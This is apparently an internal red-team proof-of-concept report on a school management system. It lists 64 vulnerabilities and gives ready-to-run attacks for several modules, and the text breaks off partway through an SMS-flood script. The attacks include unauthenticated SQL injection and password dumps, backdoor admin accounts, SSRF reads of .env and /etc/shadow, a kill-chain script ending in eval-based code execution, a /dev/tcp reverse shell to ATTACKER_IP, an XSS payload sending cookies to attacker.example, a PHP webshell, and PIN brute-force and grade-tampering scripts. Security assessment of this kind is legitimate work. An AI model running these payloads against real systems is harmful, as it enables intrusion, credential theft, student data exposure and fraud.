# Unified Proof-of-Concept Document
**Project:** `es_ldcu` — School Management System  
**Prepared by:** Internal Red Team  
**Classification:** Internal — Confidential  
**Scope:** All reviewed modules (SuperAdmin, Teacher, Finance V2, Cashier V2, Student, Registrar, College, Parent, Admin, Principal, Director)

---

> **Legal Notice:** All PoCs in this document are for authorized internal security assessment only. Do not execute against production systems without explicit written authorization from system ownership. Unauthorized use is illegal under RA 10175 (Cybercrime Prevention Act of 2012) and analogous laws.

> **Variables:** Replace `TARGET` with the application base URL (e.g., `http://localhost` or `https://your-app.com`). Replace `<SESSION_COOKIE>` with a valid `laravel_session` cookie value obtained through normal login.

---

## Full PoC Index

| # | ID | Module | Title | Auth Needed | Severity |
|---|---|---|---|---|---|
| 1 | SA-01 | SuperAdmin | Arbitrary SQL Execution (Unauthenticated) | None | CRITICAL |
| 2 | SA-02 | SuperAdmin | Unauthenticated Full Database Dump & Write | None | CRITICAL |
| 3 | SA-03 | SuperAdmin | SSRF + Local File Inclusion via `storeImage` | None | CRITICAL |
| 4 | SA-04 | SuperAdmin | RCE via `eval()` on SF9 Formula Field | Admin session | CRITICAL |
| 5 | SA-05 | SuperAdmin | Unauthenticated Credential & Contact Data Leak | None | CRITICAL |
| 6 | SA-06 | SuperAdmin | Database Backup Written to Public Web Root | Admin session | HIGH |
| 7 | SA-07 | SuperAdmin | Full Kill Chain (Unauthenticated → RCE) | None (chain) | CRITICAL |
| 8 | T-01 | Teacher | Grade Detail Inflation — Any Session | Any login | CRITICAL |
| 9 | T-02 | Teacher | Grade Header Status Bypass (Bulk Approve) | Any login | CRITICAL |
| 10 | T-03 | Teacher | Grade Workflow Approval Without Teacher Role | Any login (changed pw) | HIGH |
| 11 | T-04 | Teacher | Final Grade Save Without Teacher Auth | Any login (changed pw) | HIGH |
| 12 | T-05 | Teacher | Unauthenticated Grade Master Sheet Dump | None | HIGH |
| 13 | T-06 | Teacher | Unauthenticated Deportment Status Update | None | HIGH |
| 14 | T-07 | Teacher | Unauthenticated Grade Header Enumeration | None | MEDIUM |
| 15 | T-08 | Teacher | Cross-Teacher Attendance Manipulation | Teacher login | HIGH |
| 16 | T-09 | Teacher | Virtual Classroom Assignment IDOR | Teacher login | MEDIUM |
| 17 | FV2-01 | Finance V2 | Plaintext PIN Exposure | DB access / any | CRITICAL |
| 18 | FV2-02 | Finance V2 | Void Authorization Bypass (No Backend Check) | Auth user | CRITICAL |
| 19 | FV2-03 | Finance V2 | PIN Brute Force (No Rate Limiting) | Auth user | CRITICAL |
| 20 | FV2-04 | Finance V2 | Student Financial PII Sent to External AI | Observe traffic | HIGH |
| 21 | CV2-01 | Cashier V2 | Any User Processes Payment Transaction | Any login | HIGH |
| 22 | CV2-02 | Cashier V2 | Unauthorized Receipt Print (`serverPrint` + IDOR) | Any login | CRITICAL |
| 23 | CV2-03 | Cashier V2 | Void Any Suspended Sale (IDOR) | Any login | HIGH |
| 24 | CV2-04 | Cashier V2 | Void Permission Structure Leak | Any login | MEDIUM |
| 25 | CV2-05 | Cashier V2 | PIN Brute Force | Any login | HIGH |
| 26 | CV2-06 | Cashier V2 | Stored XSS via Non-Tuition Item / Suspended Sale | Admin/cashier | HIGH |
| 27 | ST-01 | Student | RCE via Scholarship File Upload | Any login | CRITICAL |
| 28 | ST-02 | Student | Unauthenticated SMS Injection / Flood | None | HIGH |
| 29 | ST-03 | Student | Unauthenticated Financial Data Dump (IDOR) | None | HIGH |
| 30 | ST-04 | Student | Unauthenticated Grade Report Card Dump | None | HIGH |
| 31 | ST-05 | Student | Password Harvesting from Audit Log | Student login | HIGH |
| 32 | ST-06 | Student | IDOR — Delete Any Scholarship Application | Any login | HIGH |
| 33 | R-01 | Registrar | Unauthenticated Mass Account Creation | None | CRITICAL |
| 34 | R-02 | Registrar | Unauthenticated Student Database Enumeration | None | CRITICAL |
| 35 | R-03 | Registrar | Unauthenticated Enrollment Manipulation | None | HIGH |
| 36 | R-04 | Registrar | Student Deletes Academic Configuration (RegistrarV2) | Any login | HIGH |
| 37 | R-05 | Registrar | Stored XSS via Student Name in Registrar Search | Pre-reg form | HIGH |
| 38 | R-06 | Registrar | Pre-Registration Spam (No Rate Limiting) | None | MEDIUM |
| 39 | C-01 | College | Unauthenticated Grade Corruption + Column Injection | None | CRITICAL |
| 40 | C-02 | College | Any Authenticated User Modifies K-12 Grade Records | Any login | HIGH |
| 41 | C-03 | College | Student Self-Approves and Posts Own Final Grade | Student login | HIGH |
| 42 | C-04 | College | Student Removes Subject from College Curriculum | Any login | HIGH |
| 43 | C-05 | College | Unauthenticated Grade Status Submission | None | HIGH |
| 44 | C-06 | College | Unauthenticated Student Grade Dump | None | HIGH |
| 45 | P-01 | Parent | Student Bypasses `isParent` on Data Endpoints | Student login | HIGH |
| 46 | P-02 | Parent | Fake Online Payment Submission (Negative Amount) | Student/parent | HIGH |
| 47 | P-03 | Parent | Combined Chain: Unauthenticated → Account → Fraud | None (chain) | HIGH |
| 48 | A-01 | Admin | Unauthenticated Password Reset for Any Account | None | CRITICAL |
| 49 | A-02 | Admin | Unauthenticated Plaintext Password Dump | None | CRITICAL |
| 50 | A-03 | Admin | Unauthenticated Account Creation (Arbitrary Role) | None | CRITICAL |
| 51 | A-04 | Admin | Unauthenticated Portal Privilege Grant | None | HIGH |
| 52 | A-05 | Admin | Unauthenticated Mass Account Deactivation | None | HIGH |
| 53 | A-06 | Admin | Unauthenticated K-12 Grade Approval and Posting | None | HIGH |
| 54 | A-07 | Admin | Unauthenticated Sync DB Delete | None | HIGH |
| 55 | A-08 | Admin | Full Takeover Automation Script | None (chain) | CRITICAL |
| 56 | PR-01 | Principal | Any Authenticated User Reads Principal-Only Data | Any login | CRITICAL |
| 57 | PR-02 | Principal | Unauthenticated Deportment Grade Status Write | None | CRITICAL |
| 58 | PR-03 | Principal | Authenticated User Posts and Approves Own Grades | Any login (changed pw) | HIGH |
| 59 | PR-04 | Principal | Any Authenticated User Overwrites SF9 Signatory | Any login | HIGH |
| 60 | PR-05 | Principal | IDOR in Section Profile via Decrypt Exception | Any login | MEDIUM |
| 61 | DR-01 | Director | Direct Database Access via Hardcoded Credentials | MySQL client | CRITICAL |
| 62 | DR-02 | Director | Unauthenticated Employee PII Dump | None | CRITICAL |
| 63 | DR-03 | Director | Unauthenticated Director Finance Dashboard Access | None | CRITICAL |
| 64 | DR-04 | Director | Full Multi-School Database Compromise Chain | MySQL client | CRITICAL |

---

---

## Module 1 — SuperAdmin Portal

---

### PoC SA-01 — Arbitrary SQL Execution (Unauthenticated)

**Severity:** CRITICAL | **Auth:** None | **Middleware:** `cors` only

**Vulnerable endpoints:**
- `GET /synchornization/process/updatelogs?query=<SQL>&binding[]=<values>`
- `GET /querylogsToCloud?logs=<JSON>`

Both accept raw SQL and execute via `DB::update()` with zero authentication.

#### Step 1 — Verify endpoint is accessible
```bash
curl -v "$TARGET/synchornization/process/updatelogs"
# HTTP 200 or 500 confirms the route exists and is reachable (not 401/403)
```

#### Step 2 — Enumerate database tables
```bash
# Exfiltrate all table names by writing them into a readable field
curl "$TARGET/synchornization/process/updatelogs?\
query=UPDATE+syncsetup+SET+url%3D(SELECT+GROUP_CONCAT(table_name)\
+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase())+WHERE+id%3D1"

# Then read the result
curl "$TARGET/cloudGetSyncSetup"
```

#### Step 3 — Dump all user accounts and plaintext passwords
```bash
curl "$TARGET/synchornization/process/updatelogs?\
query=UPDATE+syncsetup+SET+url%3D(SELECT+GROUP_CONCAT(email,'%3A',passwordstr\
+SEPARATOR+'%7C')+FROM+users+WHERE+passwordstr+IS+NOT+NULL+LIMIT+100)+WHERE+id%3D1"

curl "$TARGET/cloudGetSyncSetup"
# Output: admin@school.edu:SecureP@ss1|teacher01:Welcome123|...
```

#### Step 4 — Create a SuperAdmin account
```bash
# Hash for 'pwned123' — substitute your own bcrypt hash
curl "$TARGET/synchornization/process/updatelogs?\
query=INSERT+INTO+users+(name,email,password,type,deleted)\
+VALUES+(%3F,%3F,%3F,%3F,%3F)\
&binding[]=Attacker&binding[]=attacker@evil.com\
&binding[]=%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi\
&binding[]=17&binding[]=0"
```

#### Step 5 — Batch execute via `querylogsToCloud`
```bash
# URL-encode the JSON logs parameter
# Decoded: [{"query":"UPDATE users SET type=17 WHERE email=?","bindings":["target@school.edu"]}]
curl "$TARGET/querylogsToCloud?logs=%5B%7B%22query%22%3A%22UPDATE+users+SET+type%3D17+WHERE+email%3D%3F%22%2C%22bindings%22%3A%5B%22target%40school.edu%22%5D%7D%5D"
```

| Attack | SQL | Result |
|---|---|---|
| Dump passwords | `UPDATE syncsetup SET url=(SELECT GROUP_CONCAT(email,':',passwordstr) FROM users WHERE passwordstr IS NOT NULL) WHERE id=1` | All plaintext passwords |
| Delete financial records | `UPDATE chrngtrans SET deleted=1 WHERE 1=1` | All transactions wiped |
| Wipe audit trail | `UPDATE updatelogs SET deleted=1 WHERE 1=1` | Evidence destroyed |

---

### PoC SA-02 — Unauthenticated Full Database Dump & Write

**Severity:** CRITICAL | **Auth:** None

**Vulnerable endpoints (all unauthenticated):**

| Endpoint | Action |
|---|---|
| `GET /cloudNewData/{table}/{maxid}` | Read all rows from any table |
| `GET /cloudUpdatedData/{table}/{date}` | Read recently updated rows |
| `GET /getTableFields/{tablename}` | Get all column names |
| `GET /insertdatatotable?table=X&data={}` | Insert into any table |
| `GET /updatetargettable?table=X&data={}` | Update any row |
| `GET /deletetargettable?table=X&data={}` | Soft-delete any row |

#### Dump all user accounts (including plaintext passwords)
```bash
curl "$TARGET/cloudNewData/users/0"
# Returns: full users table including passwordstr (plaintext), password (bcrypt), type
```

#### Dump student PII
```bash
curl "$TARGET/cloudNewData/studinfo/0"
# Returns: names, addresses, contact numbers, birthdays, parent info, LRN
```

#### Python script — dump all critical tables
```python
#!/usr/bin/env python3
import requests, json, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"
TABLES = ["users", "studinfo", "teacher", "chrngtrans", "studledger",
          "onlinepayments", "schoolinfo", "syncsetup", "updatelogs"]

for table in TABLES:
    columns = requests.get(f"{TARGET}/getTableFields/{table}", timeout=10).json()
    data    = requests.get(f"{TARGET}/cloudNewData/{table}/0", timeout=30).json()
    print(f"[+] {table}: {len(data)} records | columns: {columns[:5]}...")
    with open(f"dump_{table}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)

print("Done — check dump_*.json files")
```

#### Create a SuperAdmin via insertdatatotable
```bash
# URL-decoded data: {"name":"TestAdmin","email":"backdoor","password":"<bcrypt>","type":"17","deleted":"0"}
curl "$TARGET/insertdatatotable?table=users\
&data=%7B%22name%22%3A%22TestAdmin%22%2C%22email%22%3A%22backdoor%22%2C\
%22password%22%3A%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%22%2C\
%22type%22%3A%2217%22%2C%22deleted%22%3A%220%22%7D"
# Login: email=backdoor / password=password
```

---

### PoC SA-03 — SSRF + Local File Inclusion via `storeImage`

**Severity:** CRITICAL | **Auth:** None | **Endpoint:** `GET /storeImage?imagepath=<URL>&tablename=X`

`file_get_contents()` fetches any URL (including `file://`, `php://`) and saves the result to `public/`.

#### Read the application `.env` file
```bash
# Linux
curl "$TARGET/storeImage?imagepath=file:///var/www/html/.env&tablename=onlinepayments"
curl "$TARGET/onlinepayments/.env"

# Windows (Laragon)
curl "$TARGET/storeImage?imagepath=file:///c:/laragon/www/es_ldcu/.env&tablename=onlinepayments"
curl "$TARGET/onlinepayments/es_ldcu/.env"
```

The `.env` file contains:
```
APP_KEY=base64:XXXXX   ← forge any session cookie → instant admin access
DB_PASSWORD=secret     ← direct DB access
AI_API_KEY=sk-or-...   ← billing theft on external AI service
```

#### Read system files
```bash
curl "$TARGET/storeImage?imagepath=file:///etc/passwd&tablename=onlinepayments"
curl "$TARGET/storeImage?imagepath=file:///etc/shadow&tablename=onlinepayments"
```

#### Scan internal network services
```bash
for PORT in 3306 6379 5432 8080 9200 27017; do
    curl -s -o /dev/null -w "Port $PORT: %{http_code}\n" \
         "$TARGET/storeImage?imagepath=http://127.0.0.1:$PORT/&tablename=onlinepayments"
done
```

#### Cloud metadata (if hosted on AWS/GCP/Azure)
```bash
curl "$TARGET/storeImage?imagepath=http://169.254.169.254/latest/meta-data/iam/security-credentials/&tablename=onlinepayments"
```

---

### PoC SA-04 — Remote Code Execution via `eval()` on SF9 Formula Field

**Severity:** CRITICAL | **Auth:** Admin session (created via SA-01/SA-02) | **Attack path:** DB write → PDF trigger → `eval()`

`DynamicPDFController` reads `sf9templateinfo.formula` from the DB and passes it to PHP `eval()`.

#### Step 1 — Inject PHP into the formula field (unauthenticated via SA-01)
```bash
# Command execution payload
curl "$TARGET/updatetargettable?table=sf9templateinfo\
&data=%7B%22id%22%3A%221%22%2C%22formula%22%3A%22system('id')%22%7D"
```

#### Step 2 — Create admin account (if needed)
```bash
curl "$TARGET/insertdatatotable?table=users\
&data=%7B%22name%22%3A%22RCE%22%2C%22email%22%3A%22rce_admin%22%2C\
%22password%22%3A%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%22%2C\
%22type%22%3A%2217%22%2C%22deleted%22%3A%220%22%7D"
```

#### Step 3 — Log in and trigger PDF generation
1. Navigate to `TARGET/login` → log in as `rce_admin` / `password`
2. Open Principal portal → School Forms → SF9
3. Generate report for any student

The `DynamicPDFController` calls `eval($formula)` during PDF generation — the injected command executes with web server privileges.

#### Reverse shell payload
```bash
# formula value (URL-encoded):
# system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
curl "$TARGET/updatetargettable?table=sf9templateinfo\
&data=%7B%22id%22%3A%221%22%2C%22formula%22%3A%22system('bash+-c+%5C%22bash+-i+%3E%26+%2Fdev%2Ftcp%2FATTACKER_IP%2F4444+0%3E%261%5C%22')%22%7D"

# On attacker machine
nc -lvnp 4444
```

---

### PoC SA-05 — Unauthenticated Credential & Contact Data Leak

**Severity:** CRITICAL | **Auth:** None | **Endpoint:** `GET /student/credentials/list`, `GET /student/contactnumber/list`

```bash
# Dump all student credential status (which students have/lack accounts)
curl "$TARGET/student/credentials/list"

# Dump all enrolled student contact numbers, addresses (student, mother, father, guardian)
curl "$TARGET/student/contactnumber/list"

# Update any student's contact number (no auth)
curl "$TARGET/student/contactnumber/update?studid=42&contactno=09000000000"
```

---

### PoC SA-06 — Database Backup in Public Web Root

**Severity:** HIGH | **Auth:** Admin session to trigger backup (but download is unauthenticated)

After an admin triggers a backup (authenticated), the SQL dump is written to `public/dbbackup/` with a predictable filename: `{dbname} MMDDYYYHHMM.sql`.

```bash
# Calculate expected filename based on approximate time of last backup
# Example: database "es_ldcu" backed up at 2026-06-11 10:30
curl "$TARGET/dbbackup/es_ldcu 0611202610300.sql"

# The dump contains all tables, all data, including plaintext passwords (passwordstr)
```

---

### PoC SA-07 — Full Kill Chain: Unauthenticated → RCE

```python
#!/usr/bin/env python3
"""
Full SuperAdmin kill chain:
1. Enumerate DB (SA-02)
2. Read .env via SSRF (SA-03) → extract APP_KEY
3. Create SuperAdmin account (SA-02)
4. Inject RCE payload into sf9templateinfo (SA-01)
5. Log in and trigger eval() (SA-04)
"""
import requests, json, sys, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"
s = requests.Session()

# Step 1: Read .env
print("[1] Reading .env via SSRF...")
s.get(f"{TARGET}/storeImage",
      params={"imagepath": "file:///var/www/html/.env", "tablename": "onlinepayments"})
env_resp = s.get(f"{TARGET}/onlinepayments/.env")
app_key = re.search(r"APP_KEY=(.+)", env_resp.text)
print(f"    APP_KEY: {app_key.group(1) if app_key else 'not found'}")

# Step 2: Create SuperAdmin
print("[2] Creating SuperAdmin account...")
s.get(f"{TARGET}/insertdatatotable", params={
    "table": "users",
    "data": json.dumps({
        "name": "Attacker", "email": "pwned_admin",
        "password": "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi",
        "type": "17", "deleted": "0", "isDefault": "0"
    })
})

# Step 3: Inject eval payload
print("[3] Injecting RCE payload...")
s.get(f"{TARGET}/updatetargettable", params={
    "table": "sf9templateinfo",
    "data": json.dumps({"id": "1", "formula": "system('id > /tmp/rce_proof.txt')"})
})

# Step 4: Login
print("[4] Logging in as SuperAdmin...")
login_page = s.get(f"{TARGET}/login")
csrf = re.search(r'name="_token"\s+value="([^"]+)"', login_page.text)
csrf = csrf.group(1) if csrf else ""
s.post(f"{TARGET}/login", data={"_token": csrf, "email": "pwned_admin", "password": "password"})

print("[+] Kill chain complete — trigger PDF generation to execute payload")
print(f"[+] APP_KEY extracted: {app_key.group(1) if app_key else 'see /onlinepayments/.env'}")
```

---

---

## Module 2 — Teacher Portal

---

### PoC T-01 — Grade Detail Inflation (Any Authenticated Session)

**Severity:** CRITICAL | **Auth:** Any login (student, parent, cashier, etc.)  
**Endpoint:** `GET /gradesdetail/update`

```bash
# Step 1: Get grade header IDs (unauthenticated — see T-07)
curl -s "http://TARGET/get/grade/header?syid=1&gradelevelid=3&subjectid=5&quarter=1&sectionid=2"
# Output: [{"id": 42, "sectionid": 2, ...}]

# Step 2: Inflate a specific student's grade to 100 (requires any valid session)
curl -s -X GET \
  --cookie "laravel_session=<ANY_SESSION_COOKIE>" \
  "http://TARGET/gradesdetail/update?\
data[0][id]=1234&data[0][studid]=456&data[0][field]=grade&data[0][grade]=100"
# Response: [{"status":1}] — grade set to 100
```

**Vulnerable code:**
```php
// TeacherGradingV2.php
DB::table('gradesdetail')
    ->where('id', $item['id'])
    ->where('studid', $item['studid'])
    ->update([
        $item['field'] => $item['grade'],   // USER-CONTROLLED COLUMN NAME AND VALUE
    ]);
```

---

### PoC T-02 — Grade Header Status Bypass (Bulk Approve)

**Severity:** CRITICAL | **Auth:** Any login  
**Endpoint:** `GET /gradesheader/update`

```bash
# Force grade header id=42 to status=3 (approved) — bypasses entire approval workflow
curl -s -X GET \
  --cookie "laravel_session=<ANY_VALID_SESSION>" \
  "http://TARGET/gradesheader/update?\
data[0][id]=42&data[0][syid]=1&data[0][sectionid]=2&data[0][subjid]=5\
&data[0][field]=status&data[0][grade]=3"
# Response: [{"status":1}]
```

**Python — bulk approve all grade headers for a school year:**
```python
import requests

s = requests.Session()
s.cookies.set("laravel_session", "<ANY_VALID_SESSION>")

# Enumerate grade headers first (see T-07), then bulk approve
for gh_id in range(1, 500):  # tune range
    r = s.get(f"http://TARGET/gradesheader/update", params={
        "data[0][id]": gh_id,
        "data[0][syid]": 1,
        "data[0][sectionid]": 1,
        "data[0][subjid]": 1,
        "data[0][field]": "status",
        "data[0][grade]": 3
    })
    try:
        if r.json()[0]["status"] == 1:
            print(f"[+] Approved header {gh_id}")
    except: pass
```

---

### PoC T-03 — Grade Workflow Approval Without Teacher Role

**Severity:** HIGH | **Auth:** Any session with a non-default password  
**Endpoint:** `GET /posting/grade/subject/approve`

```bash
# Any account that has changed its password from "123456" can call this
curl -s -X GET \
  --cookie "laravel_session=<NON_DEFAULT_PASSWORD_SESSION>" \
  "http://TARGET/posting/grade/subject/approve?gdid=789&teacherid=1"
# Note: teacherid is read but NEVER verified — any value works
```

---

### PoC T-04 — Final Grade Save Without Teacher Auth

**Severity:** HIGH | **Auth:** Any session with changed password  
**Endpoint:** `GET /teacher/finalgrades/savegrades`

```bash
curl -s -X GET \
  --cookie "laravel_session=<NON_DEFAULT_PASSWORD_SESSION>" \
  "http://TARGET/teacher/finalgrades/savegrades?\
id=1234&headerid=42&studid=456&qg=90&syid=1&semid=1&sectionid=2&levelid=3&quarter=1&subjid=5"
# gradesdetail row id=1234 now has qg=90 regardless of who submitted it
```

---

### PoC T-05 — Unauthenticated Grade Master Sheet Dump

**Severity:** HIGH | **Auth:** None  
**Endpoint:** `GET /grades/report/mastersheet`

```bash
# Full grade dump for section 2 — no login required
curl -s "http://TARGET/grades/report/mastersheet?syid=1&sectionid=2&levelid=3&quarter=1"

# Enumerate all sections (1–500)
for SID in $(seq 1 500); do
    RESULT=$(curl -s "http://TARGET/grades/report/mastersheet?syid=1&sectionid=$SID&levelid=3&quarter=1")
    if [ "$RESULT" != "[]" ] && [ -n "$RESULT" ]; then
        echo "Section $SID has grades" >> grade_dump.txt
        echo "$RESULT" >> grade_dump.txt
    fi
done

# Awards dump (also unauthenticated)
curl -s "http://TARGET/grades/report/studentawards?syid=1&levelid=3"
```

---

### PoC T-06 — Unauthenticated Deportment Status Update

**Severity:** HIGH | **Auth:** None  
**Endpoint:** `GET /posting/grade/update-grade-status`

```bash
# Enumerate students in section 2
curl -s "http://TARGET/posting/grade/get-student-list?sectionid=2&syid=1"

# Update deportment status without any login
curl -s "http://TARGET/posting/grade/update-grade-status?\
studid=456&status=3&syid=1&sectionid=2&quarter=1"
```

---

### PoC T-07 — Unauthenticated Grade Header Enumeration

**Severity:** MEDIUM | **Auth:** None (recon step for T-01, T-02)

```python
import requests

for section_id in range(1, 100):
    for level_id in range(1, 30):
        for subj_id in range(1, 50):
            r = requests.get("http://TARGET/get/grade/header", params={
                "syid": 1, "gradelevelid": level_id,
                "subjectid": subj_id, "quarter": 1, "sectionid": section_id
            }, timeout=2)
            try:
                data = r.json()
                if data:
                    print(f"[+] Section={section_id} Level={level_id} Subj={subj_id}: id={data[0]['id']}")
            except: pass
```

---

### PoC T-08 — Cross-Teacher Attendance Manipulation

**Severity:** HIGH | **Auth:** Teacher login  
**Endpoint:** `GET /classattendance/submit`

```bash
# Teacher A marks students in Teacher B's section as absent
# No check: is Teacher A assigned to student 789's section?
curl -s -X GET \
  --cookie "laravel_session=<TEACHER_A_SESSION>" \
  "http://TARGET/classattendance/submit" \
  --data-urlencode 'datavalues[0][studid]=789' \
  --data-urlencode 'datavalues[0][tdate]=2026-06-11' \
  --data-urlencode 'datavalues[0][newstatus]=absent'

# Mass absence — mark entire rival section as absent
for STUDID in $(seq 100 120); do
    curl -s --cookie "laravel_session=<TEACHER_A_SESSION>" \
         "http://TARGET/classattendance/submit" \
         --data-urlencode "datavalues[0][studid]=$STUDID" \
         --data-urlencode "datavalues[0][tdate]=2026-06-11" \
         --data-urlencode "datavalues[0][newstatus]=absent"
done
```

---

---

## Module 3 — Finance V2

---

### PoC FV2-01 — Plaintext PIN Exposure

**Severity:** CRITICAL | **Auth:** DB read access

```sql
-- Any DB read access (backup, console, phpMyAdmin) reveals all void PINs
SELECT pin_code FROM chrng_pin;
-- Expected: 1234, 5678, 0000 — all plaintext
```

Also exposed in any DB dump from SA-01/SA-02:
```bash
curl "$TARGET/cloudNewData/chrng_pin/0"
# Returns: all PIN records in JSON with plaintext pin_code values
```

---

### PoC FV2-02 — Void Authorization Bypass

**Severity:** CRITICAL | **Auth:** Any authenticated Finance user  
**Endpoint:** `POST /view-account/adjustment/{id}/void`

The PIN/credentials dialog is frontend-only. The actual void endpoint has no server-side authorization check.

```bash
# Skip the PIN dialog entirely — call the void endpoint directly
curl -s -X POST \
  -b "laravel_session=<ANY_FINANCE_SESSION>" \
  -H "Content-Type: application/json" \
  "http://TARGET/view-account/adjustment/123/void"
# Response: {"message": "Adjustment voided successfully."} — no PIN was submitted
```

---

### PoC FV2-03 — PIN Brute Force (No Rate Limiting)

**Severity:** CRITICAL | **Auth:** Any authenticated user  
**Endpoint:** `POST /view-account/verify-void-pin`

4-digit PINs have 10,000 combinations. Without rate limiting, all are exhausted in ~60 seconds.

```python
import requests

SESSION = "<SESSION_COOKIE>"
s = requests.Session()
s.cookies.set("laravel_session", SESSION)

for pin in range(0, 10000):
    padded = str(pin).zfill(4)
    r = s.post("http://TARGET/view-account/verify-void-pin",
               json={"pin": padded})
    if r.json().get("success") == True:
        print(f"[+] PIN FOUND: {padded}")
        break
    if pin % 100 == 0:
        print(f"[*] Tried {pin}/10000...")
```

---

### PoC FV2-04 — Student Financial PII Sent to External AI

**Severity:** HIGH | **Auth:** Observe network traffic during Finance session

1. Log in to FinanceV2 and navigate to Student Accounts
2. Open browser DevTools → Network tab
3. Click the AI Assistant / "Analyze" button
4. Inspect the `POST /finance-ai/analyze` request body:
   ```json
   {
     "prompt": "...",
     "context": "Student: Juan Dela Cruz (ID: 20260001)\nBalance: ₱15,000\nPayments: [...]"
   }
   ```
5. This context — containing student names, IDs, and payment history — is forwarded verbatim to `https://openrouter.ai/api/v1/chat/completions` (a third-party free-tier AI service)

No DPA exists. This is a potential RA 10173 violation.

---

---

## Module 4 — Cashier V2

---

### PoC CV2-01 — Any User Processes a Payment Transaction

**Severity:** HIGH | **Auth:** Any login (teacher, student, registrar)  
**Endpoint:** `POST /process-payment`

```bash
# Login as a teacher — not a cashier
SESSION="<TEACHER_SESSION>"

# Submit a payment transaction as a non-cashier
curl -s -X POST \
  -b "laravel_session=$SESSION" \
  -H "Content-Type: application/json" \
  "http://TARGET/process-payment" \
  -d '{
    "student_id": 123,
    "total_amount": 1000,
    "amount_tendered": 1000,
    "transaction_date": "2026-06-11",
    "receipt_type": "official_receipt",
    "payment_details": [{"type": 1, "amount": 1000, "reference": null}],
    "selected_items": [{"label": "Tuition", "particulars": "Tuition Fee",
                         "amount": 1000, "classid": 1, "itemid": null}]
  }'
# Response: {"success": true, "transaction_id": ...}
# A new chrngtrans record is created under the teacher's user ID — using up a real OR number
```

---

### PoC CV2-02 — Unauthorized Receipt Print (`serverPrint` + IDOR)

**Severity:** CRITICAL | **Auth:** Any login  
**Endpoint:** `GET /cashier/server-print?ornum=<OR>&studid=<ID>`

```bash
# Find valid OR numbers (sequential — brute force or search)
curl -b "laravel_session=<ANY_SESSION>" \
     "http://TARGET/cashier/transactions?search=&from=2026-01-01"
# Returns: transaction list with ornum and student names

# Trigger a physical print of any receipt on the server's printer
curl -b "laravel_session=<ANY_SESSION>" \
     "http://TARGET/cashier/server-print?ornum=00123&studid=456"
# Server: runs mshta.exe → prints receipt on school printer
# No ownership check, no audit log entry for the reprint
```

---

### PoC CV2-03 — Void Any Cashier's Suspended Sale (IDOR)

**Severity:** HIGH | **Auth:** Any login  
**Endpoints:** `GET /cashier/suspended-sales` then `DELETE /cashier/suspended-sales/{id}`

```bash
# List ALL suspended sales — no scoping to requesting user
curl -b "laravel_session=<ANY_SESSION>" "http://TARGET/cashier/suspended-sales"
# Returns: all suspended sales for all terminals and all cashiers

# Delete another cashier's suspended sale — no ownership check
curl -b "laravel_session=<ANY_SESSION>" \
     -X DELETE "http://TARGET/cashier/suspended-sales/7"
# Response: HTTP 200 — record deleted, original cashier's parked transaction is gone
```

---

### PoC CV2-04 — Void Permission Structure Leak

**Severity:** MEDIUM | **Auth:** Any login

```bash
curl -b "laravel_session=<ANY_SESSION>" "http://TARGET/cashier/void/check-permission"
# Reveals: Finance Admin status, pin_id, status_id — all useful for PIN brute force targeting
```

---

### PoC CV2-05 — PIN Brute Force

Same as FV2-03 but using the CashierV2 endpoint:
```python
import requests

s = requests.Session()
s.cookies.set("laravel_session", "<ANY_SESSION>")

# Get pin_id first from CV2-04
pin_id = 3  # from void/check-permission

for pin in range(0, 10000):
    r = s.post("http://TARGET/cashier/void/verify-pin",
               json={"pin": str(pin).zfill(4), "pin_id": pin_id, "chrngtransid": 999})
    if r.json().get("ok"):
        print(f"[+] PIN: {str(pin).zfill(4)}")
        auth_token = r.json().get("token")
        # Use token to void any transaction
        s.post("http://TARGET/cashier/void",
               json={"chrngtransid": 999, "auth_token": auth_token, "remarks": "test"})
        break
```

---

### PoC CV2-06 — Stored XSS via Non-Tuition Item or Suspended Sale Name

**Severity:** HIGH | **Auth:** Admin or cashier account to inject; any cashier as victim

**Variant A — Non-Tuition Item (Admin injects):**
1. Log in as Admin → navigate to Non-Tuition Items → create or edit an item
2. Set `description` field to:
   ```
   <img src=x onerror="fetch('https://attacker.example/steal?s='+document.cookie)">
   ```
3. Any cashier who opens the Cashier module will execute the payload (rendered via innerHTML in `home.blade.php`)

**Variant B — Suspended Sale Customer Name (Cashier injects):**
1. Log in as any cashier
2. Create a suspended sale for a walk-in customer
3. Set customer name to: `<img src=x onerror="alert(document.cookie)">`
4. Any cashier who opens the Suspended Sales panel on any terminal executes the payload

---

---

## Module 5 — Student Portal

---

### PoC ST-01 — RCE via Scholarship File Upload

**Severity:** CRITICAL | **Auth:** Any login  
**Endpoint:** `POST /uploadrequirement`

#### Step 1 — Create PHP webshell
```php
<?php
// shell.php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd'] . ' 2>&1') . "</pre>";
}
?>
```

#### Step 2 — Upload with any session
```bash
curl -v -X POST \
  -b "laravel_session=<ANY_SESSION>" \
  -F "file=@shell.php;type=application/octet-stream" \
  "http://TARGET/uploadrequirement"
# Response contains the stored filename: "1748908800.php"
```

#### Step 3 — Execute arbitrary commands
```bash
SHELL_URL="http://TARGET/scholarship/1748908800.php"

curl "$SHELL_URL?cmd=id"
# uid=33(www-data) gid=33(www-data)

curl "$SHELL_URL?cmd=cat+/var/www/html/.env"
# Full .env — DB credentials, APP_KEY, API keys
```

---

### PoC ST-02 — Unauthenticated SMS Injection / Flood

**Severity:** HIGH | **Auth:** None  
**Endpoint:** `POST /student/notify_individual_student`

```bash
# Single SMS — no login required
curl -X POST \
  -d "phone=09171234567" \
  "http://TARGET/student/notify_individual_student"
# Response: {"status":"success","studmsg":"LDCU: Hello! You can now proceed..."}
```

**Mass SMS flood (drains school SMS credits):**
```python
import requests, time

TARGET_PHONE = "09171234567"
for i in range(100):
    r = requests.post("http://TARGET/student/notify_individual_student",
